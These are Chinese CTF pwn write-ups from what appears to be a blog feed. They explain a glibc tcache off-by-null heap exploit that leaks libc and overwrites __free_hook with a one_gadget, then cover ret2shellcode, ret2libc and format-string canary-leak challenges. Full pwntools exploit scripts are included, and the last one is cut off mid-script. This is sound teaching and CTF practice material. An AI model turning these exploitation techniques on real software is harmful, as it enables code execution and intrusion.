<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>这两个函数会在函数 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173">_int_free</a> 和 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051">__libc_malloc</a> 的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p>
<p>从上面可以得到<code>tcache最多可以存放７个chunk。</code></p>
<h6 id="说这么多不如直接看例题！！！"><a href="#说这么多不如直接看例题！！！" class="headerlink" title="说这么多不如直接看例题！！！"></a>说这么多不如直接看例题！！！</h6><p><img src="https://s2.loli.net/2024/08/19/TkLAMtV3CehQvKs.png" alt="99397f6d2a864f9a993c5d28240239c1.png"></p>
<p>checksec之后可以看到，修改free_got为system不行了。而且还开启了本人最讨厌的PIE（本人在栈方面面对PIE比较头疼，之后经过学长指点现在可能好点。在此还是感谢我的学长），从保护机制来看肯定要泄露libc基地址。接下来进入ida来看看它的逻辑</p>
<p>main函数，先申请一个0xb0(这个大小是包含0x10的size和pre_size的，这样与pwndbg对的上，方便观察，望读者见谅）chunk，用来存放一个指针（指向你所申请的chunk的内容）还有一个用来存放你所申请的大小，经典菜单题，没有给后门函数。</p>
<p><img src="https://s2.loli.net/2024/08/19/MCOy6wsHx7dNA9G.png" alt="98064aa85e484d2598aef202a630217e.png"></p>
<p>add函数（自己命名，对着函数名按N就可以修改），可以看到固定申请得内存大小为0xf8，但是让你输入size不能大于0xf8，其实这个影响不大（基本上ctf它规定你多大基本上你也就申请那么大足够了）逻辑很简单，但是呢！！！看到哪个名字很多aaaaaa的函数了吗？哪个是关键的函数（我也给它修改了名字为了让我自己方便看）</p>
<p><img src="https://s2.loli.net/2024/08/19/OlDnVpF38MhZxty.png" alt="f28b37eb2d0347a88f0b4e4d1b2f216a.png"></p>
<p>进入aaaaaaaa函数，值得一提的是这个函数第一个参数是前面main函数提到的指针，第二个参数是main函数提到的size。if(a2)感觉很奇怪嘛，仔细看会发现result &#x3D; &amp;a1[a2]这个地方会溢出到下一个，后面<em>result &#x3D; 0正好可以想到off-by-nnull。注意其实就本人而言没必要记录什么int，long类型，其实他们的区别都是存储类型的大小不同，本质对于计算机就是存储的大小不一样，其实你只要会访问内存，就可以用有限个char</em>来表示你所需要的任意长的类型，当时如果你是个专业的程序开发人员，当菜鸡我在放屁，存在机器字长对齐的问题，它会影响性能，下次有机会也可以分析一下。</p>
<p><img src="https://s2.loli.net/2024/08/19/Pg9NFf1HL6VInuz.png" alt="98790afd591b467d8fd6c2c3ef734656.png"></p>
<p>delete函数，它很干脆没有给我们留下什么有用的</p>
<p><img src="https://s2.loli.net/2024/08/19/vGEBaoj5V1fSgds.png" alt="48fb782263bc4eadad03156ed8809fd4.png"></p>
<p>show函数</p>
<p><img src="https://s2.loli.net/2024/08/19/QctTw36L4aVlzrA.png" alt="7cfe26f519a849e1833f7f67c46669f0.png"></p>
<p>看完全部的逻辑，我们大致也了解了。因为开启了Full RELRO不能修改got表，开启PIE想着能不能泄露libc基地址。这里没有got表了，所以想到hook函数和IO流因为本人对IO不是特别熟悉所以不清楚可以不可以，所以就是用的hook函数，通过泄露main_arena。大致思路就是先申请10个chunk，将tcache给填满（chunk0-5，9），剩下的放到了unsortbins里面（chunk6，8），在重新申请这10个chunk，这样它们的pre_size位全部都填写完成，该如何泄露fd呢？这就需要利用到前面的off-by-one通过chunk7将chunk8的size位的最低inuse位变成0，这样让chunk8误以为前面的chunk都是free的状态，错把前面的chunk6，chunk7进行合并形成一个更大的chunk（size &#x3D; 0x300）</p>
<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>刚开始</p>
<p><img src="https://s2.loli.net/2024/08/19/SoZ4zF3nrcpu79w.png" alt="e754e51f76f84d80be03f9c256adf318.png"></p>
<p>一次一次free后，因为物理内存是连续的所以会合并成一个大的内存块0x300(读者可以想象一下，三个内存块连续存储在一起，本人太赖了不想移动，望读者见谅）</p>
<p><img src="https://s2.loli.net/2024/08/19/jIhkQP1rsSAOzgy.png" alt="f133ae510ecc4877b3ef4ed25255d52a.png"></p>
<p>在重新申请回来这三个chunk</p>
<p><img src="https://s2.loli.net/2024/08/19/ZhteDBdQ8sH24Lk.png" alt="c1737e4489714977967a3c89dd95f00b.png"></p>
<p>此时如果free掉chunk_6，chunk_7,chunk_6的fd就存放在main_arena的地址</p>
<p><img src="https://s2.loli.net/2024/08/19/M6teBn3VFmlRoQk.png" alt="Awn3RCVNKWz8MtU.png"></p>
<p>在申请回来chunk_7,因为off-by-one,使得0x101的inuse位变成了0。</p>
<p><img src="https://s2.loli.net/2024/08/19/rcXoI1Z4HfaxKY2.png" alt="J1q39uDa2mgWY5z.png"></p>
<p>这时候在free掉chunk_8，就会导致chunk_8以为前面都是空闲的chunk，一起合并了。这时候在申请出来chunk_6，main_arena就会改写chunk_7的fd指针，但是呢chunk_7是我们已经申请的内存，在show一下就可以泄露出来libc了。</p>
<h5 id="exp的流程图"><a href="#exp的流程图" class="headerlink" title="exp的流程图"></a>exp的流程图</h5><p>这些东西说起来容易，想起来还是很费时间的。所以比起文字我想还是用图片来代替比较好于理解。</p>
<p>申请10个chunk</p>
<p><img src="https://s2.loli.net/2024/08/19/yLbip4TY9qaM8GQ.png" alt="bcbd6c720f12439091a06d52a68f4258.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/6ByQicluYatMIdS.png" alt="6d9ff0b2207442a1a23695416fbfad68.png"></p>
<p> 在分别free掉chunk0-5,chunk9(分开free是为了防止于top chunk合并），free掉chunk6，7，8</p>
<p><img src="https://s2.loli.net/2024/08/19/AwZKkfcz86O5uXS.png" alt="d890caac82d44d7287637296a7a8f566.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/oST74nXQ5ihv8YE.png" alt="b319ebbeb2ab470f8004e604f6bf43fd.png"></p>
<p>再将其全部申请掉,（为了修改chunk_8的pre_size位为0x200)</p>
<p><img src="https://s2.loli.net/2024/08/19/sq1ZuCPyFK9m4gf.png" alt="325df0c36a82471d96734fb3d8c5da03.png"></p>
<p>再free掉0-5位的chunk,free掉8号位置的，free(7)此时chunk_6的fd指针指向main_arena + 0x60</p>
<p><img src="https://s2.loli.net/2024/08/19/ty2KUh7PmvELVai.png" alt="mSAV6HlzhLeCgXv.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/19LJX32KbzHFkaE.png" alt="09dea70c15d344f69264b4f55eb318b5.png"></p>
<p>再申请将chunk_7申请回来，再顺序free掉chunk_0和chunk_8,这时候chunk_8向前合并大chunk其size&#x3D;0x300</p>
<p><img src="https://s2.loli.net/2024/08/19/nbJEB2dhcO9mjoi.png" alt="68cc969198ee44c3a372adb6e1e08a29.png"></p>
<p>再申请8个chunk使得unsortbins修改chunk_7的fd指针为main_arena + 0x60，这时候show（0）就可以泄露出来main_arena + 0x60的值，再通过其来计算得到__malloc_hook，进而算出来libc基地址。后面就是望__free_hook里面写one_gadget。</p>
<p><img src="https://s2.loli.net/2024/08/19/VSCsQmLZgEJi6Pr.png" alt="7913c91707994d3bbc75671e2642bd35.png"></p>
<p>再申请一个chunk得到,可以看到chunk_7有两个</p>
<p><img src="https://s2.loli.net/2024/08/19/4wd7lhDCgNesWvU.png" alt="500360f1a1184d6d9f5135e1a6f091cc.png"></p>
<p>再free掉chunk_1,chunk_2来防止报错，再free（9）（0），使其类似于double fastbins那种攻击，</p>
<p><img src="https://s2.loli.net/2024/08/19/ykaZ8pv7sejfc3N.png" alt="f5c879166d6f4883bc5568589a253c19.png"></p>
<p>再通过申请两次chunk分别都是chunk_7的内容，达到修改free_hook的内容为one_gadget达到getshell</p>
<p><img src="https://s2.loli.net/2024/08/19/Mum5ZyweHQdgUt7.png" alt="2a9b715b6fc2476589257fcb25793d69.png"></p>
<h5 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h5><p>最后呢，就我个人而言，对于heap题目要注意对齐申请与不对齐申请的不同。如果你想用到下一个chunk的pre_size区域就不对其申请，如exp里面的0xf8。</p>
<h5 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h5><p>感谢阅读，本人也是小白可以留言。有机会多多交流，谢谢。</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    
    
    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content \n> "</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size of Heap :'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content of heap :'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span><span class="token comment">#tcahe 里面012345 9</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    
    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'dddd'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'eeee'</span><span class="token punctuation">)</span>

    
    show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    unsorted_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'unsorted_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>unsorted_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    main_arena <span class="token operator">=</span> unsorted_addr <span class="token operator">-</span> <span class="token number">0x60</span>

    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/da1sy/environment/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so'</span><span class="token punctuation">)</span>

    malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
    libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> malloc_hook <span class="token operator">-</span> <span class="token number">0x10</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    one_gadget1 <span class="token operator">=</span> <span class="token number">0x4f29e</span>
    one_gadget2 <span class="token operator">=</span> <span class="token number">0x4f2a5</span>
    one_gadget3 <span class="token operator">=</span> <span class="token number">0x4f302</span>
    one_gadget4 <span class="token operator">=</span> <span class="token number">0x10a2fc</span>

    one_gadget1 <span class="token operator">+=</span> libc_base
    one_gadget2 <span class="token operator">+=</span> libc_base
    one_gadget3 <span class="token operator">+=</span> libc_base
    one_gadget4 <span class="token operator">+=</span> libc_base

    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'ffff'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

    free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'free_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'aaaaa'</span><span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget3<span class="token punctuation">)</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
      <categories>
        <category>学习</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>二进制</tag>
        <tag>tcache</tag>
        <tag>高libc</tag>
      </tags>
  </entry>
  <entry>
    <title>WgpSec_CTF的pwn系列</title>
    <url>/2024/08/15/wgpsec-ctf%E7%9A%84pwn%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<blockquote>
<p> 题目链接，<a href="https://ctf.wgpsec.org/">WgpSec CTF</a></p>
</blockquote>
<p><strong>目录</strong></p>
<p><a href="#1%EF%BC%8Cret2shellcode">1，ret2shellcode</a></p>
<p><a href="#%E6%9C%89%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8Cshellcode%E3%80%82">有执行权限直接执行shellcode。</a></p>
<p><a href="#2%EF%BC%8Cezlibc">2，ezlibc </a></p>
<p><a href="#3%EF%BC%8Cfomat_leak">3，fomat_leak</a></p>
<p><a href="#4%EF%BC%8Crand">4，rand</a></p>
<p><a href="#5%EF%BC%8Cstack_migration">5，stack_migration</a></p>
<hr>
<h5 id="1，ret2shellcode"><a href="#1，ret2shellcode" class="headerlink" title="1，ret2shellcode"></a>1，ret2shellcode</h5><h5 id="有执行权限直接执行shellcode。"><a href="#有执行权限直接执行shellcode。" class="headerlink" title="有执行权限直接执行shellcode。"></a>有执行权限直接执行shellcode。</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pl <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xDEAD1000</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xDEAD1000</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">" here:\n"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
        
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://s2.loli.net/2024/08/19/h9I87lkWduoHtfn.png" alt="0bb785dcedfb4b43b87df9a4a4b4b311.png"></p>
<h5 id="2，ezlibc"><a href="#2，ezlibc" class="headerlink" title="2，ezlibc"></a>2，ezlibc</h5><p>题目libc给了。正常的ret2libc，注意栈对齐就行</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    ru<span class="token punctuation">(</span><span class="token string">"Give me some msg!\n"</span><span class="token punctuation">)</span>
    puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    main <span class="token operator">=</span> <span class="token number">0x4011bd</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x401273</span>
    ret <span class="token operator">=</span> <span class="token number">0x040101a</span>
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    puts <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>

    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/da1sy/pwn_attachment/WgpSec_CTF/ezlibc/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
    bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"Give me some msg!\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>  <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># gdb()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://s2.loli.net/2024/08/19/XqZdsQHf1OnCS6E.png" alt="c08abaf2fd7e46db856dde7c086af778.png"></p>
<h5 id="3，fomat-leak"><a href="#3，fomat-leak" class="headerlink" title="3，fomat_leak"></a>3，fomat_leak</h5><p>fmt泄露canary，然后直接控制程序执行流到system就行，也要注意栈对齐</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">" Canary?\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"%11$p"</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"Canary think it too!\n"</span><span class="token punctuation">)</span>
    canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"canary"</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span>
    
    sh <span class="token operator">=</span> <span class="token number">0x402008</span>
    system <span class="token operator">=</span> <span class="token number">0x4010b0</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x401353</span>
    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
    <span class="token comment"># ogg=[0xe3afe,0xe3b01,0xe3b04]</span>
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xaaaa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">" say?\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># gdb()</span>
